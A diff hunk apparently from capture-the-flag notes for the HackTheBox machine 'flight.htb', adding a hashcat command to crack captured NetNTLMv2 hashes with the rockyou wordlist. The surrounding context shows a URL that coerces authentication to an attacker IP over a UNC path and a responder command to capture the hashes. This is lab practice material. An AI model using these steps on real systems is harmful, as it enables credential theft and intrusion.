@@ -257,6 +257,11 @@ http://school.flight.htb/index.php?view=//10.10.16.82/test
 ```s
 responder -I tun0 -wPv
 ```
+### Crack NTLM:
+```s
+hashcat -a 0 -m 5600 hash_c.bum /usr/share/wordlists/rockyou.txt --show
+```
+
 ### Places to steal ntlm
 https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini
 
